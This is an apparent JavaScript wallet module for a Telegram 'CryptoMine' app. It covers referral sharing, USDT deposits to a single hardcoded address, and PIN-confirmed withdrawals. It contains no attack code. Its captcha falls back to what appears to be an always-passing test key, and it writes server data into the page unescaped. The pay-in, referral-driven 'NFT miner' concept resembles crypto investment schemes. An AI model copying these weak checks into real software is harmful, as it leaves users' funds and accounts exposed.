/**
 * Wallet, Transactions and Referral Module
 */
const WalletModule = {
  currentDepositNetwork: 'USDT BEP20',
  currentDepositAmount: 3,
  depositAddress: '0x5201A1A25315Eb9Cd3bcF3f6FEEA5312E1638675',
  currentWithdrawNetwork: 'USDT BEP20',

  init() {
    this.bindEvents();
    this.bindDepositEvents();
    this.bindWithdrawEvents();
  },

  bindEvents() {
    // Copy Referral Link
    const copyRefBtn = document.getElementById('btn-copy-referral-link');
    if (copyRefBtn) {
      copyRefBtn.addEventListener('click', () => {
        const link = document.getElementById('referral-link-input').value;
        navigator.clipboard.writeText(link);
        window.TelegramService.hapticNotification('success');
        window.ModalManager.showToast('Referral link copied to clipboard!', 'success');
      });
    }

    // Share Referral Link on Telegram
    const shareRefBtn = document.getElementById('btn-share-referral-tg');
    if (shareRefBtn) {
      shareRefBtn.addEventListener('click', () => {
        const link = document.getElementById('referral-link-input').value;
        const msg = encodeURIComponent(`⛏️ Join CryptoMine with me and earn daily USDT crypto rewards with NFT Miners!\n${link}`);
        const tgShareUrl = `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${msg}`;
        if (window.Telegram?.WebApp?.openTelegramLink) {
          window.Telegram.WebApp.openTelegramLink(tgShareUrl);
        } else {
          window.open(tgShareUrl, '_blank');
        }
      });
    }
  },

  openDepositPage() {
    // Reset all steps to Step 1
    const step1 = document.getElementById('deposit-step-1');
    const step2 = document.getElementById('deposit-step-2');
    const step3 = document.getElementById('deposit-step-3');
    if (step1) {
      step1.classList.add('active');
      step1.style.display = 'flex';
    }
    if (step2) {
      step2.classList.remove('active');
      step2.style.display = 'none';
    }
    if (step3) {
      step3.classList.remove('active');
      step3.style.display = 'none';
    }

    // Default amount 3
    const amtInput = document.getElementById('topup-amount-input');
    if (amtInput) {
      amtInput.value = this.currentDepositAmount || '3';
    }

    // Preset pills highlight
    document.querySelectorAll('.preset-pill').forEach(pill => {
      if (pill.dataset.amt === String(this.currentDepositAmount)) {
        pill.classList.add('active');
      } else {
        pill.classList.remove('active');
      }
    });

    // Default network USDT BEP20
    this.currentDepositNetwork = 'USDT BEP20';
    this.depositAddress = '0x5201A1A25315Eb9Cd3bcF3f6FEEA5312E1638675';
    const netCards = document.querySelectorAll('#deposit-networks-grid .withdraw-net-card');
    netCards.forEach(c => {
      if (c.dataset.network === 'USDT BEP20') c.classList.add('active');
      else c.classList.remove('active');
    });

    window.ModalManager.openModal('modal-deposit');

    // Explicitly render Turnstile Captcha for Deposit Step 1
    setTimeout(() => {
      this.renderDepositTurnstile();
    }, 100);
  },

  depositTurnstileWidgetId: null,
  depositTurnstileToken: '',

  renderDepositTurnstile() {
    const container = document.getElementById('cf-turnstile-deposit-container');
    if (!container) return;

    if (!window.turnstile) {
      setTimeout(() => this.renderDepositTurnstile(), 250);
      return;
    }

    try {
      if (this.depositTurnstileWidgetId !== null) {
        try { window.turnstile.remove(this.depositTurnstileWidgetId); } catch (e) {}
        this.depositTurnstileWidgetId = null;
      }
      container.innerHTML = '';

      const sitekey = this.siteKeys[this.currentSiteKeyIndex] || '1x00000000000000000000AA';
      this.depositTurnstileWidgetId = window.turnstile.render(container, {
        sitekey: sitekey,
        theme: 'auto',
        size: 'flexible',
        callback: (token) => {
          this.depositTurnstileToken = token;
        },
        'error-callback': (errorCode) => {
          console.warn('Deposit Turnstile error on key:', sitekey, 'Error code:', errorCode);
          if (this.currentSiteKeyIndex < this.siteKeys.length - 1) {
            this.currentSiteKeyIndex++;
            setTimeout(() => this.renderDepositTurnstile(), 150);
          }
        },
        'expired-callback': () => {
          this.depositTurnstileToken = '';
        }
      });
    } catch (err) {
      console.warn('Deposit Turnstile render exception:', err);
    }
  },

  bindDepositEvents() {
    // Preset amount pills
    const pills = document.querySelectorAll('.preset-pill');
    const amtInput = document.getElementById('topup-amount-input');
    pills.forEach(pill => {
      pill.addEventListener('click', () => {
        window.TelegramService.hapticSelection();
        pills.forEach(p => p.classList.remove('active'));
        pill.classList.add('active');
        const val = pill.dataset.amt;
        if (amtInput) amtInput.value = val;
        this.currentDepositAmount = parseFloat(val) || 3;
      });
    });

    if (amtInput) {
      amtInput.addEventListener('input', () => {
        const val = amtInput.value;
        this.currentDepositAmount = parseFloat(val) || 0;
        pills.forEach(p => {
          if (p.dataset.amt === val) p.classList.add('active');
          else p.classList.remove('active');
        });
      });
    }

    // Network cards selection
    const netCards = document.querySelectorAll('#deposit-networks-grid .withdraw-net-card');
    netCards.forEach(card => {
      card.addEventListener('click', () => {
        window.TelegramService.hapticSelection();
        netCards.forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        this.currentDepositNetwork = card.dataset.network || 'USDT BEP20';
        this.depositAddress = card.dataset.address || '0x5201A1A25315Eb9Cd3bcF3f6FEEA5312E1638675';
      });
    });

    // Proceed to Step 2 (Top up button)
    const proceedBtn = document.getElementById('btn-proceed-topup');
    if (proceedBtn) {
      proceedBtn.addEventListener('click', () => {
        const amt = parseFloat(amtInput?.value) || 0;
        if (amt < 1) {
          window.ModalManager.showToast('Minimum deposit amount is 1 USDT', 'error');
          return;
        }

        // Cloudflare Turnstile Captcha verification check
        let turnstileToken = this.depositTurnstileToken;
        if (window.turnstile && this.depositTurnstileWidgetId !== null) {
          try {
            turnstileToken = window.turnstile.getResponse(this.depositTurnstileWidgetId) || this.depositTurnstileToken;
          } catch (e) {}
        }

        const turnstileWidget = document.getElementById('cf-turnstile-deposit-container');
        if (turnstileWidget && window.turnstile && !turnstileToken) {
          window.TelegramService.hapticNotification('warning');
          window.ModalManager.showToast('Please complete Captcha verification!', 'error');
          return;
        }

        this.currentDepositAmount = amt;
        this.goToDepositStep2();
      });
    }

    // Back from Step 2 to Step 1
    const backBtn = document.getElementById('btn-back-deposit-step1');
    if (backBtn) {
      backBtn.addEventListener('click', () => {
        window.TelegramService.hapticSelection();
        const step1 = document.getElementById('deposit-step-1');
        const step2 = document.getElementById('deposit-step-2');
        const step3 = document.getElementById('deposit-step-3');
        if (step3) {
          step3.classList.remove('active');
          step3.style.display = 'none';
        }
        if (step2) {
          step2.classList.remove('active');
          step2.style.display = 'none';
        }
        if (step1) {
          step1.classList.add('active');
          step1.style.display = 'flex';
        }
      });
    }

    // Copy Deposit Address in Step 2
    const copyAddrBtn = document.getElementById('btn-copy-deposit-addr');
    if (copyAddrBtn) {
      copyAddrBtn.addEventListener('click', () => {
        const addr = document.getElementById('deposit-crypto-address')?.textContent || this.depositAddress;
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(addr);
        }
        window.TelegramService.hapticNotification('success');
        window.ModalManager.showToast('Address copied to clipboard!', 'success');
      });
    }

    // Copy Amount inline link in Step 2
    const copyAmtBtn = document.getElementById('btn-copy-pay-amount');
    if (copyAmtBtn) {
      copyAmtBtn.addEventListener('click', () => {
        const amtStr = `${this.currentDepositAmount} USDT`;
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(amtStr);
        }
        window.TelegramService.hapticNotification('success');
        window.ModalManager.showToast('Amount copied!', 'success');
      });
    }

    // Proceed from Step 2 to Step 3 (Verify / Submit TxID)
    const proceedStep3Btn = document.getElementById('btn-proceed-to-step3');
    if (proceedStep3Btn) {
      proceedStep3Btn.addEventListener('click', () => this.goToDepositStep3());
    }

    // Back from Step 3 to Step 2
    const backStep2Btn = document.getElementById('btn-back-deposit-step2');
    if (backStep2Btn) {
      backStep2Btn.addEventListener('click', () => this.backToDepositStep2());
    }

    // Paste TxID button in Step 3
    const pasteTxBtn = document.getElementById('btn-paste-deposit-txhash');
    const txInput = document.getElementById('deposit-txhash-input');
    if (pasteTxBtn && txInput) {
      pasteTxBtn.addEventListener('click', async () => {
        window.TelegramService.hapticSelection();
        try {
          if (navigator.clipboard && navigator.clipboard.readText) {
            const text = await navigator.clipboard.readText();
            if (text) {
              txInput.value = text.trim();
              window.ModalManager.showToast('TxID pasted from clipboard!', 'success');
              return;
            }
          }
        } catch (e) {
          console.warn('Clipboard read error:', e);
        }
        txInput.focus();
      });
    }

    // Submit / Confirm TxID Deposit Action in Step 3
    const confirmTxBtn = document.getElementById('btn-confirm-tx-hash');
    if (confirmTxBtn) {
      confirmTxBtn.addEventListener('click', () => this.handleDeposit());
    }
  },

  goToDepositStep2() {
    window.TelegramService.hapticImpact('medium');

    const step1 = document.getElementById('deposit-step-1');
    const step2 = document.getElementById('deposit-step-2');
    const step3 = document.getElementById('deposit-step-3');

    // Populate data
    const payAmtEl = document.getElementById('pay-detail-amount');
    const payBalEl = document.getElementById('pay-detail-balance');
    const payNetNameEl = document.getElementById('pay-detail-network-name');
    const payIconWrapEl = document.getElementById('pay-detail-icon-wrap');
    const addrEl = document.getElementById('deposit-crypto-address');
    const qrImgEl = document.getElementById('deposit-qr-image');

    const amountNum = parseFloat(this.currentDepositAmount) || 3;
    if (payAmtEl) payAmtEl.textContent = `${amountNum} USDT`;
    if (payBalEl) payBalEl.textContent = `${amountNum.toFixed(2)} USDT`;
    if (payNetNameEl) payNetNameEl.textContent = this.currentDepositNetwork || 'USDT BEP20';
    if (addrEl) addrEl.textContent = this.depositAddress || '0x5201A1A25315Eb9Cd3bcF3f6FEEA5312E1638675';

    // Update dynamic QR Code
    if (qrImgEl) {
      const targetAddr = this.depositAddress || '0x5201A1A25315Eb9Cd3bcF3f6FEEA5312E1638675';
      qrImgEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(targetAddr)}`;
    }

    // Update Icon
    if (payIconWrapEl) {
      if (this.currentDepositNetwork === 'BNB') {
        payIconWrapEl.innerHTML = `
          <div class="net-main-icon bnb-bg">
            <svg viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" fill="#F3BA2F"/>
              <path d="M12 6L14.5 8.5L12 11L9.5 8.5L12 6Z" fill="#FFFFFF"/>
              <path d="M16 10L18.5 12.5L16 15L13.5 12.5L16 10Z" fill="#FFFFFF"/>
              <path d="M8 10L10.5 12.5L8 15L5.5 12.5L8 10Z" fill="#FFFFFF"/>
              <path d="M12 14L14.5 16.5L12 19L9.5 16.5L12 14Z" fill="#FFFFFF"/>
              <path d="M12 11L13.5 12.5L12 14L10.5 12.5L12 11Z" fill="#FFFFFF"/>
            </svg>
          </div>
          <span class="net-sub-badge badge-bep">B</span>
        `;
      } else {
        payIconWrapEl.innerHTML = `
          <div class="net-main-icon tether-bg">
            <img src="/assets/icons/usdt-logo.avif" alt="USDT" class="net-img-icon" />
          </div>
          <span class="net-sub-badge badge-bep">B</span>
        `;
      }
    }

    if (step1) {
      step1.classList.remove('active');
      step1.style.display = 'none';
    }
    if (step3) {
      step3.classList.remove('active');
      step3.style.display = 'none';
    }
    if (step2) {
      step2.classList.add('active');
      step2.style.display = 'flex';
    }
  },

  goToDepositStep3() {
    window.TelegramService.hapticImpact('medium');

    const step1 = document.getElementById('deposit-step-1');
    const step2 = document.getElementById('deposit-step-2');
    const step3 = document.getElementById('deposit-step-3');

    const amountNum = parseFloat(this.currentDepositAmount) || 3;
    const recapAmtEl = document.getElementById('recap-deposit-amount');
    const recapNetEl = document.getElementById('recap-deposit-network');
    const recapAddrEl = document.getElementById('recap-deposit-addr');
    const txInput = document.getElementById('deposit-txhash-input');

    if (recapAmtEl) recapAmtEl.textContent = `${amountNum.toFixed(2)} USDT`;
    if (recapNetEl) recapNetEl.textContent = this.currentDepositNetwork || 'USDT BEP20';
    if (recapAddrEl) {
      const addr = this.depositAddress || '0x5201A1A25315Eb9Cd3bcF3f6FEEA5312E1638675';
      recapAddrEl.textContent = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
    }
    if (txInput) txInput.value = '';

    if (step1) {
      step1.classList.remove('active');
      step1.style.display = 'none';
    }
    if (step2) {
      step2.classList.remove('active');
      step2.style.display = 'none';
    }
    if (step3) {
      step3.classList.add('active');
      step3.style.display = 'flex';
    }
  },

  backToDepositStep2() {
    window.TelegramService.hapticSelection();

    const step1 = document.getElementById('deposit-step-1');
    const step2 = document.getElementById('deposit-step-2');
    const step3 = document.getElementById('deposit-step-3');

    if (step3) {
      step3.classList.remove('active');
      step3.style.display = 'none';
    }
    if (step1) {
      step1.classList.remove('active');
      step1.style.display = 'none';
    }
    if (step2) {
      step2.classList.add('active');
      step2.style.display = 'flex';
    }
  },

  networkConfigs: {
    'USDT BEP20': { min: 0.15, fee: 0.005 },
    'USDT TRC20': { min: 10.0, fee: 1.0 },
    'USDT TON':   { min: 10.0, fee: 1.0 },
    'USDT SOL':   { min: 10.0, fee: 1.0 }
  },

  bindWithdrawEvents() {
    // 1. Network selection
    const netCards = document.querySelectorAll('.withdraw-net-card');
    netCards.forEach(card => {
      card.addEventListener('click', () => {
        window.TelegramService.hapticSelection();
        netCards.forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        this.currentWithdrawNetwork = card.dataset.network || 'USDT BEP20';
        
        const config = this.networkConfigs[this.currentWithdrawNetwork] || this.networkConfigs['USDT BEP20'];
        const minEl = document.getElementById('withdraw-min-limit-val');
        const feeEl = document.getElementById('withdraw-platform-fee-val');
        const amtInput = document.getElementById('withdraw-amount-input');

        if (minEl) minEl.textContent = `${config.min} USDT`;
        if (feeEl) feeEl.textContent = `${config.fee} USDT`;
        if (amtInput) {
          amtInput.placeholder = config.min.toString();
          amtInput.min = config.min.toString();
        }

        this.updateWithdrawCalculation();
      });
    });

    // 2. Realtime Amount Calculation
    const amtInput = document.getElementById('withdraw-amount-input');
    if (amtInput) {
      amtInput.addEventListener('input', () => this.updateWithdrawCalculation());
    }

    // 3. MAX Button
    const maxBtn = document.getElementById('btn-withdraw-max');
    if (maxBtn) {
      maxBtn.addEventListener('click', () => {
        window.TelegramService.hapticSelection();
        const state = window.appState.getState();
        const bal = state.balance || 0;
        if (amtInput) {
          amtInput.value = bal.toFixed(4);
          this.updateWithdrawCalculation();
        }
      });
    }

    // 4. Paste Button for Wallet Address
    const pasteBtn = document.getElementById('btn-paste-withdraw-addr');
    const addrInput = document.getElementById('withdraw-address-input');
    if (pasteBtn && addrInput) {
      pasteBtn.addEventListener('click', async () => {
        window.TelegramService.hapticSelection();
        try {
          if (navigator.clipboard && navigator.clipboard.readText) {
            const text = await navigator.clipboard.readText();
            if (text) {
              addrInput.value = text.trim();
              window.ModalManager.showToast('Wallet address pasted!', 'success');
              return;
            }
          }
        } catch (e) {
          console.warn('Clipboard read failed:', e);
        }
        addrInput.focus();
      });
    }

    // 5. Submit Withdraw Action (Requests 4-digit PIN & opens PIN modal)
    const submitWithBtn = document.getElementById('btn-submit-withdraw');
    if (submitWithBtn) {
      submitWithBtn.addEventListener('click', () => this.handleWithdraw());
    }

    // 6. 4-Digit Security PIN Inputs Handling
    const pinBoxes = document.querySelectorAll('#withdraw-pin-inputs .pin-digit-box');
    pinBoxes.forEach((box, idx) => {
      box.addEventListener('input', (e) => {
        const val = e.target.value.replace(/\D/g, '');
        e.target.value = val ? val[0] : '';
        if (e.target.value) {
          box.classList.add('filled');
          if (idx < pinBoxes.length - 1) {
            pinBoxes[idx + 1].focus();
          } else {
            // Auto trigger confirm when last digit is entered
            setTimeout(() => this.handleConfirmWithdrawPin(), 120);
          }
        } else {
          box.classList.remove('filled');
        }
      });

      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && idx > 0) {
          pinBoxes[idx - 1].focus();
          pinBoxes[idx - 1].value = '';
          pinBoxes[idx - 1].classList.remove('filled');
        } else if (e.key === 'Enter') {
          this.handleConfirmWithdrawPin();
        }
      });

      box.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = (e.clipboardData || window.clipboardData).getData('text').trim().replace(/\D/g, '');
        if (pastedData) {
          const digits = pastedData.slice(0, 4).split('');
          digits.forEach((d, i) => {
            if (pinBoxes[i]) {
              pinBoxes[i].value = d;
              pinBoxes[i].classList.add('filled');
            }
          });
          if (digits.length === 4) {
            pinBoxes[3].focus();
            setTimeout(() => this.handleConfirmWithdrawPin(), 150);
          } else if (pinBoxes[digits.length]) {
            pinBoxes[digits.length].focus();
          }
        }
      });
    });

    // 7. Confirm PIN Button
    const confirmPinBtn = document.getElementById('btn-confirm-withdraw-pin');
    if (confirmPinBtn) {
      confirmPinBtn.addEventListener('click', () => this.handleConfirmWithdrawPin());
    }

    // 8. Resend PIN Button
    const resendPinBtn = document.getElementById('btn-resend-withdraw-pin');
    if (resendPinBtn) {
      resendPinBtn.addEventListener('click', () => this.handleResendWithdrawPin());
    }
  },

  pendingWithdrawalPayload: null,

  updateWithdrawCalculation() {
    const amtInput = document.getElementById('withdraw-amount-input');
    const receivedEl = document.getElementById('withdraw-received-val');
    const amt = parseFloat(amtInput?.value) || 0;
    const config = this.networkConfigs[this.currentWithdrawNetwork] || this.networkConfigs['USDT BEP20'];
    const fee = config.fee;

    if (receivedEl) {
      if (amt >= config.min) {
        const receiveVal = Math.max(0, amt - fee);
        receivedEl.textContent = `${receiveVal.toFixed(4)} USDT`;
      } else {
        receivedEl.textContent = `0.0000 USDT`;
      }
    }
  },

  turnstileWidgetId: null,
  turnstileToken: '',
  siteKeys: [
    '0x4AAAAAAFHWuDzRc4UGLOJmo9WXQScgzOk',
    '0x4AAAAAAFHWuB54UEvkuKEt',
    '1x00000000000000000000AA'
  ],
  currentSiteKeyIndex: 0,

  renderTurnstile() {
    const container = document.getElementById('cf-turnstile-container');
    if (!container) return;

    if (!window.turnstile) {
      setTimeout(() => this.renderTurnstile(), 250);
      return;
    }

    try {
      if (this.turnstileWidgetId !== null) {
        try { window.turnstile.remove(this.turnstileWidgetId); } catch (e) {}
        this.turnstileWidgetId = null;
      }
      container.innerHTML = '';

      const sitekey = this.siteKeys[this.currentSiteKeyIndex] || '1x00000000000000000000AA';
      this.turnstileWidgetId = window.turnstile.render(container, {
        sitekey: sitekey,
        theme: 'auto',
        size: 'flexible',
        callback: (token) => {
          this.turnstileToken = token;
        },
        'error-callback': (errorCode) => {
          console.warn('Turnstile error on key:', sitekey, 'Error code:', errorCode);
          if (this.currentSiteKeyIndex < this.siteKeys.length - 1) {
            this.currentSiteKeyIndex++;
            setTimeout(() => this.renderTurnstile(), 150);
          }
        },
        'expired-callback': () => {
          this.turnstileToken = '';
        }
      });
    } catch (err) {
      console.warn('Turnstile render exception:', err);
    }
  },

  openWithdrawPage() {
    const state = window.appState.getState();
    const availBalEl = document.getElementById('withdraw-avail-bal');
    if (availBalEl) {
      availBalEl.textContent = `${(state.balance || 0).toFixed(4)} USDT`;
    }
    
    // Reset to USDT BEP20 default
    this.currentWithdrawNetwork = 'USDT BEP20';
    const netCards = document.querySelectorAll('.withdraw-net-card');
    netCards.forEach(c => {
      if (c.dataset.network === 'USDT BEP20') c.classList.add('active');
      else c.classList.remove('active');
    });

    const minEl = document.getElementById('withdraw-min-limit-val');
    const feeEl = document.getElementById('withdraw-platform-fee-val');
    const amtInput = document.getElementById('withdraw-amount-input');
    if (minEl) minEl.textContent = '0.15 USDT';
    if (feeEl) feeEl.textContent = '0.005 USDT';
    if (amtInput) {
      amtInput.placeholder = '0.15';
      amtInput.min = '0.15';
    }

    this.updateWithdrawCalculation();

    window.ModalManager.openModal('modal-withdraw');

    // Explicitly render Turnstile once modal becomes visible
    setTimeout(() => {
      this.renderTurnstile();
    }, 100);
  },

  async handleDeposit() {
    const amt = this.currentDepositAmount || parseFloat(document.getElementById('topup-amount-input')?.value) || 3.0;
    const txInput = document.getElementById('deposit-txhash-input');
    const txHash = txInput?.value?.trim() || '';

    if (!txHash) {
      window.TelegramService.hapticNotification('warning');
      window.ModalManager.showToast('Please enter or paste your Transaction ID (TxID)!', 'error');
      if (txInput) txInput.focus();
      return;
    }

    const confirmBtn = document.getElementById('btn-confirm-tx-hash');
    const originalBtnHtml = confirmBtn ? confirmBtn.innerHTML : '<span>Confirm & Add USDT</span>';
    if (confirmBtn) {
      confirmBtn.disabled = true;
      confirmBtn.innerHTML = '<span>Verifying TxID...</span>';
    }

    window.TelegramService.hapticImpact('heavy');
    try {
      const res = await window.ApiService.deposit(amt, this.currentDepositNetwork, txHash);
      if (res.success) {
        window.TelegramService.hapticNotification('success');
        window.MiningModule.playSuccessSound();
        window.appState.setState({
          balance: res.newBalance,
          depositBalance: res.depositBalance
        });
        if (window.MiningModule && window.MiningModule.updateBalanceUI) {
          window.MiningModule.updateBalanceUI(res.newBalance, res.depositBalance);
        }
        window.ModalManager.closeModal('modal-deposit');
        if (txInput) txInput.value = '';
        this.loadProfileWalletStats();
      } else {
        window.ModalManager.showToast(res.message || 'Verification failed. Please check TxID.', 'error');
      }
    } catch (err) {
      console.error('Deposit error:', err);
      window.ModalManager.showToast('Failed to verify deposit. Please try again.', 'error');
    } finally {
      if (confirmBtn) {
        confirmBtn.disabled = false;
        confirmBtn.innerHTML = originalBtnHtml;
      }
    }
  },

  async handleWithdraw() {
    const amtInput = document.getElementById('withdraw-amount-input');
    const addrInput = document.getElementById('withdraw-address-input');
    const amt = parseFloat(amtInput?.value);
    const addr = addrInput?.value.trim();
    const state = window.appState.getState();
    const config = this.networkConfigs[this.currentWithdrawNetwork] || this.networkConfigs['USDT BEP20'];

    if (!amt || amt < config.min) {
      window.ModalManager.showToast(`Minimum withdrawal for ${this.currentWithdrawNetwork} is ${config.min} USDT`, 'error');
      return;
    }

    if (state.balance < amt) {
      window.ModalManager.showToast(`Insufficient balance! Available: ${state.balance.toFixed(4)} USDT`, 'error');
      return;
    }

    if (!addr) {
      window.ModalManager.showToast('Please enter or paste your wallet address', 'error');
      return;
    }

    // Cloudflare Turnstile Verification check
    let turnstileToken = this.turnstileToken;
    if (window.turnstile && this.turnstileWidgetId !== null) {
      try {
        turnstileToken = window.turnstile.getResponse(this.turnstileWidgetId) || this.turnstileToken;
      } catch (e) {}
    }

    const turnstileWidget = document.getElementById('cf-turnstile-container');
    if (turnstileWidget && window.turnstile && !turnstileToken) {
      window.ModalManager.showToast('Please complete Cloudflare Captcha verification!', 'error');
      return;
    }

    const submitBtn = document.getElementById('btn-submit-withdraw');
    const originalBtnHtml = submitBtn ? submitBtn.innerHTML : '<span>Withdraw</span>';
    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span>Requesting Security Code...</span>';
    }

    window.TelegramService.hapticImpact('heavy');
    try {
      // 1. Request 4-digit code & customized Security Card photo in Telegram
      const res = await window.ApiService.requestWithdrawCode(amt, addr, this.currentWithdrawNetwork, turnstileToken);
      if (res && res.success) {
        window.TelegramService.hapticNotification('success');
        this.pendingWithdrawalPayload = {
          amt,
          addr,
          network: this.currentWithdrawNetwork,
          turnstileToken
        };

        // Open PIN verification modal
        window.ModalManager.openModal('modal-withdraw-pin');

        // Reset and focus first digit input
        const pinBoxes = document.querySelectorAll('#withdraw-pin-inputs .pin-digit-box');
        pinBoxes.forEach(b => {
          b.value = '';
          b.classList.remove('filled');
        });
        if (pinBoxes[0]) {
          setTimeout(() => pinBoxes[0].focus(), 150);
        }

        window.ModalManager.showToast('Security PIN & Card sent to your Telegram Bot! 🛡️', 'success');
      } else {
        const errMsg = res?.message || res?.error || 'Failed to request security code. Please try again.';
        window.ModalManager.showToast(errMsg, 'error');
      }
    } catch (err) {
      console.error('Withdraw code request error:', err);
      window.ModalManager.showToast('Network error while requesting code. Please try again.', 'error');
    } finally {
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalBtnHtml;
      }
    }
  },

  async handleConfirmWithdrawPin() {
    if (!this.pendingWithdrawalPayload) {
      window.ModalManager.showToast('Withdrawal details missing. Please try again.', 'error');
      window.ModalManager.closeModal('modal-withdraw-pin');
      return;
    }

    const pinBoxes = document.querySelectorAll('#withdraw-pin-inputs .pin-digit-box');
    const code = Array.from(pinBoxes).map(b => b.value.trim()).join('');

    if (code.length !== 4) {
      window.TelegramService.hapticNotification('warning');
      window.ModalManager.showToast('Please enter the complete 4-digit code sent to your Telegram Bot.', 'error');
      // Focus first empty box
      for (const b of pinBoxes) {
        if (!b.value) { b.focus(); break; }
      }
      return;
    }

    const confirmBtn = document.getElementById('btn-confirm-withdraw-pin');
    const originalBtnHtml = confirmBtn ? confirmBtn.innerHTML : '<span>Confirm & Proceed Withdrawal</span>';
    if (confirmBtn) {
      confirmBtn.disabled = true;
      confirmBtn.innerHTML = '<span>Verifying PIN & Submitting...</span>';
    }

    const { amt, addr, network, turnstileToken } = this.pendingWithdrawalPayload;

    window.TelegramService.hapticImpact('heavy');
    try {
      const res = await window.ApiService.withdraw(amt, addr, network, turnstileToken, code);
      if (res && res.success) {
        window.TelegramService.hapticNotification('success');
        window.MiningModule.playSuccessSound();
        window.ModalManager.showToast(res.message || 'Withdrawal request submitted successfully!', 'success');
        
        window.appState.setState({ balance: res.newBalance });
        if (window.MiningModule && window.MiningModule.updateBalanceUI) {
          window.MiningModule.updateBalanceUI(res.newBalance);
        }

        // Close both modals
        window.ModalManager.closeModal('modal-withdraw-pin');
        window.ModalManager.closeModal('modal-withdraw');

        // Reset inputs
        const amtInput = document.getElementById('withdraw-amount-input');
        const addrInput = document.getElementById('withdraw-address-input');
        if (amtInput) amtInput.value = '';
        if (addrInput) addrInput.value = '';
        pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
        this.pendingWithdrawalPayload = null;
        this.turnstileToken = '';
        this.updateWithdrawCalculation();
        this.loadProfileWalletStats();
      } else {
        window.TelegramService.hapticNotification('error');
        const errMsg = res?.message || res?.error || 'Invalid 4-digit security code. Please check your Telegram bot.';
        window.ModalManager.showToast(errMsg, 'error');
        pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
        if (pinBoxes[0]) pinBoxes[0].focus();
      }
    } catch (err) {
      console.error('Withdraw submit error:', err);
      window.ModalManager.showToast('Network error while processing withdrawal. Please try again.', 'error');
    } finally {
      if (confirmBtn) {
        confirmBtn.disabled = false;
        confirmBtn.innerHTML = originalBtnHtml;
      }
    }
  },

  async handleResendWithdrawPin() {
    if (!this.pendingWithdrawalPayload) {
      window.ModalManager.showToast('Please submit withdrawal details first.', 'error');
      return;
    }

    const resendBtn = document.getElementById('btn-resend-withdraw-pin');
    if (resendBtn) {
      resendBtn.disabled = true;
      resendBtn.textContent = '⏳ Sending...';
    }

    const { amt, addr, network, turnstileToken } = this.pendingWithdrawalPayload;
    try {
      const res = await window.ApiService.requestWithdrawCode(amt, addr, network, turnstileToken);
      if (res && res.success) {
        window.TelegramService.hapticNotification('success');
        window.ModalManager.showToast('New 4-digit code sent to your Telegram Bot! 🛡️', 'success');
        const pinBoxes = document.querySelectorAll('#withdraw-pin-inputs .pin-digit-box');
        pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
        if (pinBoxes[0]) pinBoxes[0].focus();
      } else {
        window.ModalManager.showToast(res?.message || 'Failed to resend code.', 'error');
      }
    } catch (e) {
      window.ModalManager.showToast('Network error. Please try again.', 'error');
    } finally {
      if (resendBtn) {
        resendBtn.disabled = false;
        resendBtn.textContent = '🔄 Resend Code';
      }
    }
  },

  async loadProfileWalletStats() {
    const res = await window.ApiService.getWalletDetails();
    if (res.success) {
      const elEarned = document.getElementById('profile-total-earned');
      const elWithdrawn = document.getElementById('profile-total-withdrawn');
      const elTxList = document.getElementById('profile-tx-list');

      if (elEarned) elEarned.textContent = Number(res.totalEarned).toFixed(4);
      if (elWithdrawn) elWithdrawn.textContent = Number(res.totalWithdrawn).toFixed(4);

      if (elTxList && res.transactions) {
        elTxList.innerHTML = res.transactions.map(tx => `
          <div class="tx-item">
            <div class="tx-left-col">
              <span class="tx-name">${tx.type}</span>
              <span class="tx-time">${tx.date}</span>
            </div>
            <span class="tx-amt ${tx.positive ? 'positive' : 'negative'}">${tx.amount}</span>
          </div>
        `).join('');
      }
    }
  }
};

window.WalletModule = WalletModule;
